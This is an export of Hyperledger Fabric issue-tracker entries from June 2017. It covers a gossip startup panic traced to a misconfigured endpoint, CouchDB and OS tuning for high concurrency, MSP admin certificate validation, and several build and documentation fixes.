Index out of range error when loading certificate chain,FAB-4867,18331,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,reubent 1,reubent 1,20/Jun/17 1:33 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 8:31 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,"*What happens:* If there is a problem with the certificate chain when instantiating the gossip system in a peer, the entire process bails out.

*When does it happen:* When trying to start gossip as part of the node start

*Expected behaviour:* an informative error to be returned
{noformat}
root@peer0-131666332-1jhl2:/etc/hyperledger/fabric# peer node start 
2017-06-19 16:21:58.750 UTC [msp] getMspConfig -> INFO 001 crls folder not found at [/etc/hyperledger/fabric/msp/intermediatecerts]. Skipping.: [stat /etc/hyperledger/fabric/msp/crls: no such file or directory]
2017-06-19 16:21:58.775 UTC [nodeCmd] serve -> INFO 002 Starting peer:
Version: 1.0.0-beta
Go version: go1.7.5
OS/Arch: linux/amd64
Chaincode:
Base Image Version: 0.3.1
Base Docker Namespace: hyperledger
Base Docker Label: org.hyperledger.fabric
Docker Namepace: hyperledger

2017-06-19 16:21:58.775 UTC [ledgermgmt] initialize -> INFO 003 Initializing ledger mgmt
2017-06-19 16:21:58.775 UTC [kvledger] NewProvider -> INFO 004 Initializing ledger provider
2017-06-19 16:21:58.776 UTC [kvledger.util] CreateDirIfMissing -> DEBU 005 CreateDirIfMissing [/var/hyperledger/production/ledgersData/ledgerProvider/]
2017-06-19 16:21:58.776 UTC [kvledger.util] logDirStatus -> DEBU 006 Before creating dir - [/var/hyperledger/production/ledgersData/ledgerProvider/] exists
2017-06-19 16:21:58.776 UTC [kvledger.util] logDirStatus -> DEBU 007 After creating dir - [/var/hyperledger/production/ledgersData/ledgerProvider/] exists
2017-06-19 16:21:58.780 UTC [kvledger.util] CreateDirIfMissing -> DEBU 008 CreateDirIfMissing [/var/hyperledger/production/ledgersData/chains/index/]
2017-06-19 16:21:58.780 UTC [kvledger.util] logDirStatus -> DEBU 009 Before creating dir - [/var/hyperledger/production/ledgersData/chains/index/] exists
2017-06-19 16:21:58.780 UTC [kvledger.util] logDirStatus -> DEBU 00a After creating dir - [/var/hyperledger/production/ledgersData/chains/index/] exists
2017-06-19 16:21:58.786 UTC [kvledger] NewProvider -> DEBU 00b Constructing leveldb VersionedDBProvider
2017-06-19 16:21:58.786 UTC [stateleveldb] NewVersionedDBProvider -> DEBU 00c constructing VersionedDBProvider dbPath=/var/hyperledger/production/ledgersData/stateLeveldb
2017-06-19 16:21:58.787 UTC [kvledger.util] CreateDirIfMissing -> DEBU 00d CreateDirIfMissing [/var/hyperledger/production/ledgersData/stateLeveldb/]
2017-06-19 16:21:58.787 UTC [kvledger.util] logDirStatus -> DEBU 00e Before creating dir - [/var/hyperledger/production/ledgersData/stateLeveldb/] exists
2017-06-19 16:21:58.787 UTC [kvledger.util] logDirStatus -> DEBU 00f After creating dir - [/var/hyperledger/production/ledgersData/stateLeveldb/] exists
2017-06-19 16:21:58.790 UTC [historyleveldb] NewHistoryDBProvider -> DEBU 010 constructing HistoryDBProvider dbPath=/var/hyperledger/production/ledgersData/historyLeveldb
2017-06-19 16:21:58.790 UTC [kvledger.util] CreateDirIfMissing -> DEBU 011 CreateDirIfMissing [/var/hyperledger/production/ledgersData/historyLeveldb/]
2017-06-19 16:21:58.790 UTC [kvledger.util] logDirStatus -> DEBU 012 Before creating dir - [/var/hyperledger/production/ledgersData/historyLeveldb/] exists
2017-06-19 16:21:58.790 UTC [kvledger.util] logDirStatus -> DEBU 013 After creating dir - [/var/hyperledger/production/ledgersData/historyLeveldb/] exists
2017-06-19 16:21:58.792 UTC [kvledger] NewProvider -> INFO 014 ledger provider Initialized
2017-06-19 16:21:58.792 UTC [kvledger] recoverUnderConstructionLedger -> DEBU 015 Recovering under construction ledger
2017-06-19 16:21:58.792 UTC [kvledger] recoverUnderConstructionLedger -> DEBU 016 No under construction ledger found. Quitting recovery
2017-06-19 16:21:58.792 UTC [ledgermgmt] initialize -> INFO 017 ledger mgmt initialized
2017-06-19 16:21:58.794 UTC [peer] func1 -> INFO 018 Auto detected peer address: 172.17.0.7:7051
2017-06-19 16:21:58.795 UTC [peer] func1 -> INFO 019 Auto detected peer address: 172.17.0.7:7051
2017-06-19 16:21:58.797 UTC [nodeCmd] serve -> INFO 01a Starting peer with TLS enabled
2017-06-19 16:21:58.799 UTC [eventhub_producer] AddEventType -> DEBU 01b Registering BLOCK
2017-06-19 16:21:58.800 UTC [eventhub_producer] AddEventType -> DEBU 01c Registering CHAINCODE
2017-06-19 16:21:58.800 UTC [eventhub_producer] AddEventType -> DEBU 01d Registering REJECTION
2017-06-19 16:21:58.800 UTC [eventhub_producer] AddEventType -> DEBU 01e Registering REGISTER
2017-06-19 16:21:58.800 UTC [eventhub_producer] start -> INFO 01f Event processor started
2017-06-19 16:21:58.801 UTC [nodeCmd] registerChaincodeSupport -> DEBU 020 Chaincode startup timeout value set to 5m0s
2017-06-19 16:21:58.801 UTC [chaincode] NewChaincodeSupport -> INFO 021 Chaincode support using peerAddress: 172.17.0.7:7051
2017-06-19 16:21:58.802 UTC [chaincode] NewChaincodeSupport -> DEBU 022 Turn off keepalive(value 0)
2017-06-19 16:21:58.802 UTC [chaincode] NewChaincodeSupport -> DEBU 023 Setting execute timeout value to 30s
2017-06-19 16:21:58.803 UTC [chaincode] getLogLevelFromViper -> DEBU 024 CORE_CHAINCODE_LEVEL set to level debug
2017-06-19 16:21:58.804 UTC [chaincode] getLogLevelFromViper -> DEBU 025 CORE_CHAINCODE_SHIM set to level debug
2017-06-19 16:21:58.805 UTC [sccapi] RegisterSysCC -> INFO 026 system chaincode cscc(github.com/hyperledger/fabric/core/scc/cscc) registered
2017-06-19 16:21:58.805 UTC [sccapi] RegisterSysCC -> INFO 027 system chaincode lscc(github.com/hyperledger/fabric/core/scc/lscc) registered
2017-06-19 16:21:58.806 UTC [sccapi] RegisterSysCC -> INFO 028 system chaincode escc(github.com/hyperledger/fabric/core/scc/escc) registered
2017-06-19 16:21:58.806 UTC [sccapi] RegisterSysCC -> INFO 029 system chaincode vscc(github.com/hyperledger/fabric/core/scc/vscc) registered
2017-06-19 16:21:58.806 UTC [sccapi] RegisterSysCC -> INFO 02a system chaincode qscc(github.com/hyperledger/fabric/core/chaincode/qscc) registered
2017-06-19 16:21:58.807 UTC [nodeCmd] serve -> DEBU 02b Running peer
2017-06-19 16:21:58.807 UTC [msp] GetLocalMSP -> DEBU 02c Returning existing local MSP
2017-06-19 16:21:58.807 UTC [msp] GetLocalMSP -> DEBU 02d Returning existing local MSP
2017-06-19 16:21:58.807 UTC [msp] GetDefaultSigningIdentity -> DEBU 02e Obtaining default signing identity
2017-06-19 16:21:58.808 UTC [gossip/service] func1 -> INFO 02f Initialize gossip with endpoint peer0 and bootstrap set [127.0.0.1:7051]
2017-06-19 16:21:58.808 UTC [msp] GetLocalMSP -> DEBU 030 Returning existing local MSP
2017-06-19 16:21:58.808 UTC [msp] DeserializeIdentity -> INFO 031 Obtaining identity
2017-06-19 16:21:58.809 UTC [msp/identity] newIdentity -> DEBU 032 Creating identity instance for ID &{GospelTest c05fd73ae4c3fa9bf21f53780b33796d7e9888790f24e3b92ac0d3c0b6096c2a}
2017-06-19 16:21:58.809 UTC [msp] GetLocalMSP -> DEBU 033 Returning existing local MSP
2017-06-19 16:21:58.809 UTC [msp] Validate -> DEBU 034 MSP GospelTest validating identity
2017-06-19 16:21:58.811 UTC [msp] getCertificationChain -> DEBU 035 MSP GospelTest getting certification chain
panic: runtime error: index out of range

goroutine 1 [running]:
panic(0xc9c680, 0xc4200160a0)
/opt/go/src/runtime/panic.go:500 +0x1a1
github.com/hyperledger/fabric/gossip/integration.newConfig(0xc4201f33b8, 0x5, 0xc42000c442, 0xa, 0xc4200ae7e0, 0x1, 0x1, 0x20)
/opt/gopath/src/github.com/hyperledger/fabric/gossip/integration/integration.go:37 +0x6ea
github.com/hyperledger/fabric/gossip/integration.NewGossipComponent(0xc420085080, 0x52b, 0x580, 0xc4201f33b8, 0x5, 0xc42017c780, 0x13d3fa0, 0xc4200ae9b0, 0x13e45e0, 0xc42036ae70, ...)
/opt/gopath/src/github.com/hyperledger/fabric/gossip/integration/integration.go:79 +0x93
github.com/hyperledger/fabric/gossip/service.InitGossipServiceCustomDeliveryFactory.func1()
/opt/gopath/src/github.com/hyperledger/fabric/gossip/service/gossip_service.go:146 +0x41d
sync.(*Once).Do(0x1423388, 0xc4201756b8)
/opt/go/src/sync/once.go:44 +0xdb
github.com/hyperledger/fabric/gossip/service.InitGossipServiceCustomDeliveryFactory(0xc420085080, 0x52b, 0x580, 0xc4201f33b8, 0x5, 0xc42017c780, 0x13d3ea0, 0x14232b8, 0x13e45e0, 0xc42036ae70, ...)
/opt/gopath/src/github.com/hyperledger/fabric/gossip/service/gossip_service.go:157 +0x139
github.com/hyperledger/fabric/gossip/service.InitGossipService(0xc420085080, 0x52b, 0x580, 0xc42034f200, 0xf, 0xc42017c780, 0x13e45e0, 0xc42036ae70, 0x13d3fa0, 0xc4200ae9b0, ...)
/opt/gopath/src/github.com/hyperledger/fabric/gossip/service/gossip_service.go:129 +0x13a
github.com/hyperledger/fabric/peer/node.serve(0x14232b8, 0x0, 0x0, 0x0, 0x0)
/opt/gopath/src/github.com/hyperledger/fabric/peer/node/start.go:174 +0x71c
github.com/hyperledger/fabric/peer/node.glob..func1(0x13ca260, 0x14232b8, 0x0, 0x0, 0x0, 0x0)
/opt/gopath/src/github.com/hyperledger/fabric/peer/node/start.go:70 +0x3f
github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).execute(0x13ca260, 0x14232b8, 0x0, 0x0, 0x13ca260, 0x14232b8)
/opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:599 +0x234
github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).ExecuteC(0x13ca8c0, 0xf, 0xc420010455, 0xa)
/opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:689 +0x367
github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).Execute(0x13ca8c0, 0x1b, 0xc420010455)
/opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:648 +0x2b
main.main()
/opt/gopath/src/github.com/hyperledger/fabric/peer/main.go:117 +0x54e
{noformat}
This was discussed with [~yacovm] on Rocket Chat.",Running custom MSP within Kubernetes based setup. I totally acknowledge I've done something wrong with the certs - it just shouldn't crash out.,C0rWin,reubent 1,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jun/17 1:46 AM;reubent 1;core.yaml;https://jira.hyperledger.org/secure/attachment/11203/core.yaml","20/Jun/17 1:38 AM;reubent 1;msp.tar;https://jira.hyperledger.org/secure/attachment/11202/msp.tar",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4rj:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,reubent 1,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Jun/17 1:36 AM;yacovm;can I have the msp folder and core.yaml please?;;;","20/Jun/17 6:26 AM;C0rWin;{code}
    # Gossip related configuration
    gossip:
        # Bootstrap set to initialize gossip with.
        # This is a list of peers that the peer reaches out to at startup.
        # Important: The endpoints here have to be endpoints of peers in the same
        # organization, because the peer would refuse connecting to these endpoints
        # unless they are in the same organization as the peer.
        bootstrap: 127.0.0.1:7051

        # NOTE: orgLeader and useLeaderElection parameters are mutual exclusive
        # setting both to true would result in the termination of the peer, since this is undefined
        # state.

        # Defines whenever peer will initialize dynamic algorithm for
        # ""leader"" selection, where leader is the peer to establish
        # connection with ordering service and use delivery protocol
        # to pull ledger blocks from ordering service
        useLeaderElection: false
        # Statically defines peer to be an organization ""leader"",
        # where this means that current peer will maintain connection
        # with ordering service and disseminate block across peers in
        # its own organization
        orgLeader: true

        # ID of this instance
        endpoint: peer0
        # Maximum count of blocks we store in memory
{code}

The {{endpoint}} parameter missing port number, hence the failure during the startup as it fails to parse it. While this is clearly misconfiguration, I will add a patch which will provide meaningful error message and will handle it more gracefully.

[~reubent 1] ^^^;;;","21/Jun/17 7:54 AM;C0rWin;https://gerrit.hyperledger.org/r/#/c/10877/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Consortium members cannot be referenced by policies in ordering system channel,FAB-4871,18341,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,20/Jun/17 4:03 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jun/17 6:46 AM,,,,v1.0.0,,fabric-orderer,,,,,,0,,,,,,,"The consortium member MSP definitions are currently parsed, but they are not included into the ordering system channel MSP manager.  This means that policies which reference consortium organizations will always evaluate to false.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4s7:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Jun/17 4:07 AM;jyellick;In review via: https://gerrit.hyperledger.org/r/#/c/10793/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Errors during stress test due to not enough resources configured for CouchDB,FAB-4872,18342,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,markparz,denyeart,denyeart,20/Jun/17 4:16 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Nov/17 12:06 AM,v1.0.0-beta,,,Future,,fabric-docs,,,,,,0,,,,,,,"This is a follow-on doc defect to address the root cause problems found in FAB-4243. In a nutshell, in order to utilize CouchDB in a highly concurrent environment with large number of channels (CouchDB databases), several OS and CouchDB settings need to be configured.

In addition to documenting the OS ulimit setting (FAB-3464), the OS ephemeral port settings and CouchDB max_dbs_open parameters need to be documented. For details see FAB-4243.

 ",,chris.elder,denyeart,markparz,ohori,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,FAB-4243,FAB-3464,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4sf:",,,,,,,,,,,,,,,,,,,,,,,chris.elder,denyeart,markparz,ohori,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jun/17 8:35 PM;denyeart;[~chris.elder] max_dbs_open default value of 8000 (1000 databases) has been added to local.ini in FAB-4243.

Could you summarize the final FAB-4243 recommendations into the Description of this item, so that they can be documented?  e.g. the Linux and Mac recommended settings for ephemeral ports, as well as a mention of ulimit and max_dbs_open.  So that doc authors can simply look at Description here, rather than parse through all the details in FAB-4243 comments.;;;","20/Jun/17 11:18 PM;chris.elder;Settings for large numbers of channels:

1. The ulimit for open files needs to be adequate for handling the large number of open files.

ulimit -n 40000

2. The max_dbs_open setting in the CouchDB refers to the maximum number of open shards. In the default
settings, each database (channel) will have 8 shards. For a concurrency of 1000 channels, the minimum
setting of max_dbs_open would be 8000. max_dbs_open = number of channels * shards per database (q)

[couchdb]
max_dbs_open = 8000


Settings for high concurrency:

1. High concurrency requires a port of each CouchDB connection. For high concurrency, the number of
ephemeral ports can be exhausted causing failed connections to CouchDB.

Linux:

Review the range of ephemeral ports:

sysctl net.ipv4.ip_local_port_range

Review the FIN-WAIT-2 timeout:

sysctl net.ipv4.tcp_fin_timeout


a. Increase the number of ephemeral ports to increase the number of possible socket connections:

sudo sysctl -w net.ipv4.ip_local_port_range=""20000 60999""

b. Reduce the timeout for sockets to remain in the FIN-WAIT-2 state before timing out to 5 seconds.

sudo sysctl -w net.ipv4.tcp_fin_timeout=""5""


MacOS:

Review the range of ephemeral ports:

sysctl net.inet.ip.portrange.first net.inet.ip.portrange.last

Review the maximum segment lifetime.

sysctl net.inet.tcp.msl

sysctl net.inet.tcp.msl

a. Increase the number of ephemeral ports to increase the number of possible socket connections:

sudo sysctl -w net.inet.ip.portrange.first=20000

sudo sysctl -w net.inet.ip.portrange.last=65535


b. Reduce the maximum segment lifetime (in milliseconds)

sudo sysctl -w net.inet.tcp.msl=5000;;;","27/Oct/17 1:07 AM;markparz;updated ledger doc... [https://gerrit.hyperledger.org/r/c/14891/]

 

[~chris.elder] [~denyeart] if you can take a look I added an additional note based off this defect and the other one that this branched from.;;;","31/Oct/17 3:45 AM;markparz;Based on conversation with [~denyeart] ... here is my proposed update for S.O. at least for a stop gap until we create a real ""tuning guide"":

 

Issue:
 CouchDB error: 
 2017-05-30 14:24:07.695 EDT [couchdb] handleRequest -> DEBU 2c45 HTTP Request: GET /chain_0008/testChaincode%00key_000000222?attachments=true HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
 2017-05-30 14:24:07.695 EDT [couchdb] ReadDoc -> DEBU 2c41 couchDBReturn=<nil>
 panic: Error:Get [http://127.0.0.1:5984/chain_0006/testChaincode%00key_000000269?attachments=true:] EOF

Answer:

This is likely an issue with concurrency and not enough resources available. You will need to increase the maximum number of open files descriptors. This can be done with :

First verify you have enough system resource allocated to the shell:

ulimit -a

When running at a high volume you probably would want something like 40000. To increase the ulimit use the following command:

ulimit -n 40000

Now for the CouchDB specific settings. CouchDB uses Least Recently Used (LRU) cache to manage open databases, and closes databases as needed. The current default setting is 8000, which should handle a fairly significant currency load. Deployments with large numbers of channels and high concurrency may need to increase this setting. Specify the number of database shards that can be open concurrently. Beware too high of a setting can impact your local resources since this is utilizing more memory resources.

To increase the maximum number of open shards in CouchDB edit fabric/images/couchdb/local.ini change

max_open_dbs=8000

This default setting is set so each database(channel) will have 8 shards. Meaning, for concurrency of 1000 channels the minimum setting of max_dbs_open would be 8000 (our current default). max_dbs_open=number of channels * shards per database.

After these setting changes you will then build your image.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add connection management between peer and CouchDB,FAB-4873,18346,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,denyeart,denyeart,20/Jun/17 5:16 AM,23/Jan/20 6:51 AM,28/Oct/23 3:00 AM,23/Jan/20 6:51 AM,,,,Future,,fabric-ledger,,,,,,0,stale-item,,,,,,"FAB-4243 has shown that high concurrency environments can run into issues due to the large number of http connections between peer and CouchDB.  While configuration updates on the OS and CouchDB can be made to handle the large number of connections, it would also be valuable to better control and manage the connections from the peer.

Two ideas:

1) For the committer logic, since it is the most critical peer role, utilize a dedicated connection to CouchDB to reduce the chance of connection errors.

2) For the endorser logic, since it is not as critical as the committer, utilize a connection pool, so that endorsement requests for the database queue up (and eventually time out) rather than hitting connection errors immediately, when there are many concurrent requests.",,denyeart,ohori,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy4sv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,ohori,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:51 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
We need to force that admins are valid identities of an msp ,FAB-4874,18347,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ales,elli-androulaki,elli-androulaki,20/Jun/17 5:31 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 3:07 PM,,,,v1.0.0,,fabric-crypto,,,,,,0,,,,,,,"This was reported by [~angelo.decaro].
 
So far, it was not enforced that admin certificates are valid identities for the MSP they are responsible for, i.e., have a certificate that is signed by one of the CAs considered in the MSP (see, [https://github.com/hyperledger/fabric/blob/master/docs/source/msp-identity-validity-rules.rst] for more information on MSP identity validity). This could cause issues when this admin is requested to read content of a certain channel (default policies allow read-access to only members of the MSPs of a certain channel), or the admin is requested to be revoked.
 
Currently, the process followed when revoking an admin would depend on whether an admin is a valid identity for that MSP:
 * if the admin is valid identity for the MSP it refers to, revocation of its certificate is performed in two steps: i) the admin's cert is removed from the admins part of MSP configuration (removing the role of admin from the specific certificate), and ii) the admin's cert is added to the CRL of its parent CA. 
 * if the admin is not a valid identity for the MSP it refers to, revocation of the admin w.r.t. that MSP only requires removal of the admin's cert from the MSP's admins.
 
A suggested solution is to force that the admin's certificate is a valid identity for that MSP according to [https://github.com/hyperledger/fabric/blob/master/docs/source/msp-identity-validity-rules.rst].",,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzxp4f:",,,,,,,,,,,,,,,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Jun/17 8:40 PM;elli-androulaki;Related CR: [https://gerrit.hyperledger.org/r/#/c/10831]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
create 'fabric-samples' repository,FAB-4875,18370,18271,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,20/Jun/17 8:05 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jun/17 9:19 AM,v1.0.0-beta,,,v1.0.0-rc1,,fabric-build,,,,,,0,build-system,,,,,,"see parent JIRA, this new repository will serve as home for the various formally supported fabric sample applications used in the docs, etc.

It should be added to Gerrit, mirrored to GH and have the same policy as fabric repo (2+2 with same maintainers).",,ChristopherFerris,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4t3:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jun/17 9:20 AM;ryjones;gerrit: [https://gerrit.hyperledger.org/r/#/admin/projects/fabric-samples]

mirror: [https://github.com/hyperledger/fabric-samples]

has same rules as Fabric;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Goo.gl link points to wrong location,FAB-4876,18371,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tkuhrt,tkuhrt,tkuhrt,20/Jun/17 9:36 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 11:58 PM,,,,,,,,,,,,0,,,,,,,"[https://github.com/hyperledger/fabric/blob/master/devenv/failure-motd.in] has a goo.gl link [https://goo.gl/yqjRC7] that points to [https://github.com/hyperledger/fabric/wiki/Troubleshooting-devenv-provisioning].  When we moved the Wiki from github.com to wiki.hyperledger.org, the link was never updated.

I have created another short link ([http://bit.ly/2sk2Kh2)] that points to the correct page (https://wiki.hyperledger.org/projects/fabric/trouble-shooting/devenv-provisioning)",,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4tb:",,,,,,,,,,,,,,,,,,,,,,,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jun/17 3:05 AM;tkuhrt;https://gerrit.hyperledger.org/r/10847;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Some source files have CRLF line terminators,FAB-4879,18409,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,lehors,lehors,lehors,20/Jun/17 2:37 PM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,23/Jun/17 7:48 PM,v1.0.0-beta,,,Future,,,,,,,,0,,,,,,,"$ file core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/Event.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/Event.java: ASCII text, with CRLF line terminators

Below is the whole list, excluding vendor:

$ git ls-files|while read f;do file $f|grep -q ""with CRLF"" && echo $f;done
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/CBDesc.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/Callback.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/CallbackKey.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/CallbackType.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/Event.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/EventDesc.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/EventKey.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/FSM.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/Transitioner.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/exceptions/AsyncException.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/exceptions/CancelledException.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/exceptions/InTrasistionException.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/exceptions/InvalidEventException.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/exceptions/NoTransitionException.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/exceptions/NotInTransitionException.java
core/chaincode/shim/java/src/main/java/org/hyperledger/fabric/shim/fsm/exceptions/UnknownEventException.java
examples/chaincode/java/Example/src/main/java/example/Example.java
examples/chaincode/java/chaincode_example02/src/main/java/example/Example02.java
examples/chaincode/java/chaincode_example04/src/main/java/example/Example04.java",,lehors,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy4zb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,lehors,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
restore deleted images ,FAB-4880,18410,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,20/Jun/17 2:47 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jun/17 2:53 PM,v1.0.0-beta,,,Not a Bug,,fabric-docs,,,,,,0,Documentation,,,,,,"a set of images had been incorrectly deleted [1] (because they were misplaced). Restoring them to their rightful location.

[1] https://gerrit.hyperledger.org/r/#/c/10675/",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4zj:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
